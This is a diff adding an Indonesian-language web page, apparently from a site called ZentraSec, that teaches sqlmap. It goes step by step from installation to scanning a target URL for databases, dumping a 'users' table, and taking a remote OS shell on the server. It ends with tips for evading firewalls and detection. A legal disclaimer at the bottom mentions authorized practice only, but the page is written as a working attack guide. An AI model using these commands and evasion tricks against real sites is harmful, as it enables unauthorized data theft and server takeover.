@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial sqlmap | ZentraSec</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root { --accent: #ff3b30; --text: #1d1d1f; --sub: #636366; --code-bg: #0d1117; --border: rgba(0,0,0,0.06); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background: #ffffff; color: var(--text); line-height: 1.7; }
+        
+        nav { padding: 12px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.8); backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100; }
+        .container { max-width: 700px; margin: 40px auto; padding: 0 20px; }
+        
+        /* Judul Rapi, Nggak Segede Gaban */
+        .meta { font-size: 0.65rem; font-weight: 800; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block; }
+        h1 { font-size: 1.8rem; font-weight: 800; letter-spacing: -0.8px; line-height: 1.2; color: #111; margin-bottom: 30px; }
+        
+        .hero-img { width: 100%; height: 320px; border-radius: 18px; overflow: hidden; margin-bottom: 40px; border: 1px solid var(--border); }
+        .hero-img img { width: 100%; height: 100%; object-fit: cover; content: url('https://h.top4top.io/p_3681vwh7q7.png'); }
+
+        h2 { font-size: 1.3rem; font-weight: 800; margin: 40px 0 15px; color: #000; }
+        p { margin-bottom: 20px; font-size: 0.95rem; color: #444; }
+
+        /* Kotak Penjelasan Simpel */
+        .info-card { background: #f9f9fb; padding: 20px; border-radius: 14px; border: 1px solid var(--border); margin: 25px 0; }
+        .info-card b { color: #000; font-size: 0.9rem; display: block; margin-bottom: 5px; }
+        .info-card p { font-size: 0.88rem; margin: 0; color: var(--sub); }
+
+        /* Code Block Minimalis */
+        .code-block { background: var(--code-bg); color: #abb2bf; padding: 18px; border-radius: 12px; font-family: 'Fira Code', monospace; font-size: 0.82rem; margin: 20px 0; overflow-x: auto; }
+        .code-block b { color: var(--accent); }
+
+        .footer-disclaimer { margin-top: 80px; padding: 25px; border-radius: 14px; background: #fff1f0; border: 1px solid #ffa39e; }
+        .footer-disclaimer h4 { color: #cf1322; font-size: 0.9rem; margin-bottom: 10px; }
+        .footer-disclaimer p { font-size: 0.82rem; margin: 0; color: #555; }
+
+        footer { text-align: center; padding: 60px 0; font-size: 0.6rem; color: #bbb; letter-spacing: 2px; border-top: 1px solid var(--border); }
+    </style>
+</head>
+<body>
+    <nav>
+        <div style="font-weight: 900; color: #000; font-size: 1rem;">ZENTRA<span style="color:var(--accent)">SEC</span></div>
+        <a href="hacking.html" style="text-decoration:none; color:#666; font-size:0.65rem; font-weight:700; border: 1px solid #eee; padding: 5px 12px; border-radius: 6px;">Kembali</a>
+    </nav>
+
+    <article class="container">
+        <span class="meta">Step-by-Step Guide</span>
+        <h1>Tutorial Penggunaan sqlmap: Dari Instalasi Hingga OS Shell</h1>
+
+        <div class="hero-img"><img></div>
+
+        <div class="article-body">
+            <p>Banyak orang bingung pakai <b>sqlmap</b> karena terlalu banyak perintah. Tenang, kita bedah pelan-pelan pakai bahasa yang gampang dimengerti, dari cara pasang sampai dapet akses ke sistem target.</p>
+
+            <h2>1. Persiapan & Instalasi</h2>
+            <p>Apapun perangkatnya (Termux, Linux, atau VPS), cara pasangnya sama karena pakai basis <b>Python</b>.</p>
+            
+            <div class="code-block">
+                git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev<br>
+                cd sqlmap-dev
+            </div>
+
+            <div class="info-card">
+                <b>Kenapa pakai perintah itu?</b>
+                <p>Kita mengambil "nyawa" sqlmap langsung dari pusatnya (GitHub) supaya dapat fitur terbaru untuk nembus keamanan web zaman sekarang.</p>
+            </div>
+
+            <h2>2. Mencari Celah (Scanning)</h2>
+            <p>Langkah awal adalah "mengetuk pintu" target untuk melihat apakah ada celah yang bisa dimasuki.</p>
+            
+            <div class="code-block">
+                python3 sqlmap.py -u "http://target.com/cek.php?id=1" --dbs
+            </div>
+
+            <div class="info-card">
+                <b>Penjelasan Perintah:</b>
+                <p><b>-u :</b> Target URL yang mau dicek.<br><b>--dbs :</b> Menyuruh sqlmap mencari nama-nama Database yang ada di dalamnya.</p>
+            </div>
+
+            <h2>3. Mengambil Data (Dumping)</h2>
+            <p>Setelah tahu nama Database-nya, saatnya kita intip isi tabel dan datanya.</p>
+            
+            <div class="code-block">
+                <span style="color:#777"># Cari Tabel di database 'db_utama'</span><br>
+                python3 sqlmap.py -u "URL" -D db_utama --tables<br><br>
+                <span style="color:#777"># Ambil data dari tabel 'users'</span><br>
+                python3 sqlmap.py -u "URL" -D db_utama -T users --dump
+            </div>
+
+            <h2>4. Level Master: Ambil Alih Sistem (--os-shell)</h2>
+            <p>Ini adalah tahap akhir. Jika beruntung, kita bisa mengendalikan server lewat terminal jarak jauh.</p>
+            
+            <div class="code-block">
+                python3 sqlmap.py -u "URL" <b>--os-shell</b>
+            </div>
+
+            <div class="info-card">
+                <b>Apa itu OS Shell?</b>
+                <p>Kondisi di mana kita bisa mengetik perintah apa saja ke server target, seperti melihat file sistem atau menghapus data, langsung dari terminal kita.</p>
+            </div>
+
+            <h2>5. Tips Biar Nggak Gampang Ketahuan</h2>
+            <p>Biar nggak langsung diblokir sama keamanan web target, gunakan trik ini:</p>
+            <ul>
+                <li style="font-size: 0.9rem; margin-bottom: 10px;"><b>--random-agent :</b> Menyamarkan diri jadi browser biasa (Chrome/Safari).</li>
+                <li style="font-size: 0.9rem; margin-bottom: 10px;"><b>--tamper=space2comment :</b> Mengacak kode biar nggak kebaca sama satpam digital (Firewall).</li>
+            </ul>
+
+            <div class="footer-disclaimer">
+                <h4>Peringatan Hukum (Disclaimer)</h4>
+                <p>Segala isi tutorial ini ditujukan untuk pembelajaran keamanan informasi saja. Melakukan serangan ke sistem orang lain tanpa izin adalah tindakan ilegal (UU ITE). Gunakan ilmu ini dengan bijak di lingkungan latihan sendiri.</p>
+            </div>
+        </div>
+    </article>
+
+    <footer>
+        &copy; 2026 ZENTRASEC - TUTORIAL SIMPLE & PADAT
+    </footer>
+</body>
+</html>
+          
